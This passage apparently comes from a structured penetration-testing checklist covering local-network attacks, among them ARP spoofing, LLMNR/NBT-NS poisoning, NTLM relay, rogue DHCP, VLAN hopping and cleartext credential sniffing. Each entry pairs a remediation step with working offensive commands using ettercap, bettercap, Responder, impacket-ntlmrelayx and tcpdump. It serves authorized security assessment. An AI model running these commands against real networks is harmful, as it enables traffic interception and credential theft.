items.how_to_fix: Patch the TLS library (OpenSSL etc.), disable RSA key exchange (ROBOT), disable vulnerable features, and rotate keys/certs if Heartbleed-exposed. Re-scan to confirm remediation.

items.title: Test ARP spoofing on local segments
items.description: ARP spoofing places the tester on-path, enabling interception/modification of traffic between hosts on the same segment.
items.how_to_find:
Attempt ARP cache poisoning between two hosts (authorized, controlled):

```
ettercap -T -M arp:remote /<victim>// /<gateway>//
# or bettercap: net.probe on; set arp.spoof.targets <victim>; arp.spoof on
```
items.how_to_fix: Enable Dynamic ARP Inspection + DHCP snooping on switches, use static ARP for critical hosts, segment with private VLANs, and encrypt traffic (so MITM yields little). Monitor for ARP anomalies.

items.title: Test LLMNR/NBT-NS/mDNS poisoning
items.description: When LLMNR/NBT-NS are enabled, spoofed responses coerce hosts to send NetNTLM hashes that can be cracked or relayed.
items.how_to_find:
Respond to broadcast name resolution to capture hashes:

```
responder -I <iface> -wv
```

Captured NetNTLM hashes = high finding.
items.how_to_fix: Disable LLMNR (GPO: Turn off multicast name resolution), disable NBT-NS on adapters, and disable mDNS where unused. Ensure DNS is correct so clients don't fall back. Re-test Responder captures nothing.

items.title: Test NTLM relay to unsigned hosts
items.description: Coerced NetNTLM authentication can be relayed to SMB/LDAP/HTTP targets lacking signing, yielding code execution or privilege escalation.
items.how_to_find:
Relay captured NTLM auth to hosts without SMB signing:

```
responder -I <iface> -wv    # (disable SMB/HTTP servers in Responder.conf)
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Successful relay (session/DCSync/exec) = critical.
items.how_to_fix: Require SMB signing (and LDAP signing + channel binding), disable NTLM where possible (Kerberos only), enable EPA on web services, and disable LLMNR/NBT-NS to cut the capture source. Re-test relay fails.

items.title: Test for rogue DHCP and gateway redirection
items.description: A rogue DHCP server can set the tester as default gateway/DNS, redirecting traffic for interception.
items.how_to_find:
Detect/introduce a rogue DHCP offering a malicious gateway/DNS (authorized):

```
# detect: nmap --script broadcast-dhcp-discover
# or observe multiple DHCP offers on the segment
```
items.how_to_fix: Enable DHCP snooping (trusted ports only), port security, and Dynamic ARP Inspection; segment and monitor for rogue DHCP/gateway. Alert on unexpected DHCP servers.

items.title: Sniff for cleartext credentials on the wire
items.description: Protocols like HTTP, FTP, Telnet, POP3, IMAP, and SNMP v1/v2c carry credentials in cleartext that can be captured on-path.
items.how_to_find:
Capture and extract creds from cleartext protocols (authorized, on-path):

```
tcpdump -i <iface> -w cap.pcap
# then: ngrep -I cap.pcap -i 'pass|login' ; or Wireshark 'Follow TCP Stream'
```
items.how_to_fix: Encrypt all protocols (HTTPS/SSH/SFTP/LDAPS), disable cleartext services, and segment so sniffing is hard. Rotate any credentials observed in cleartext. Re-audit that no creds traverse in clear.

items.title: Inventory cleartext protocols in use
items.description: Identifying all unencrypted protocols across the estate quantifies sniffing exposure and guides remediation toward encrypted equivalents.
items.how_to_find:
Identify unencrypted services on the network:

```
nmap -sV -p21,23,80,110,143,161,389,1433,3306 <range>
```

HTTP/FTP/Telnet/POP3/IMAP/SNMPv2/LDAP(cleartext) are findings.
items.how_to_fix: Migrate each to its encrypted equivalent (HTTPS, SFTP, SSH, IMAPS/POP3S, SNMPv3, LDAPS) and disable the cleartext version. Re-scan to confirm cleartext services are gone.

items.title: Detect sensitive data transmitted in cleartext
items.description: Beyond credentials, cleartext traffic may expose PII, tokens, internal hostnames, and business data subject to interception.
items.how_to_find:
Inspect captured traffic for PII/secrets/session tokens in the clear:

```
# Wireshark filters: http.authorization, http.cookie, or search stream for PII
```
items.how_to_fix: Enforce TLS everywhere (including internal/east-west), mark cookies `Secure`, and avoid sending sensitive data over unencrypted channels. Rotate exposed tokens/data. Re-verify with a capture.

items.title: Assess broadcast/multicast and VLAN exposure
items.description: Broadcast/multicast traffic and weak VLAN segmentation can expose data and name-resolution requests to attackers on the segment.
items.how_to_find:
Look for chatty broadcast/multicast protocols and VLAN hopping potential:

```
# observe LLMNR/NBT-NS/mDNS/CDP/STP broadcasts in a capture
nmap --script broadcast-* -e <iface>
# VLAN hopping: yersinia (DTP), or test double-tagging
```
items.how_to_fix: Disable unneeded broadcast protocols, set switchports to `access` with DTP off (no auto-trunk), remove native VLAN from trunks, and segment with private VLANs. Re-test that VLAN hopping and broadcast leakage are mitigated.
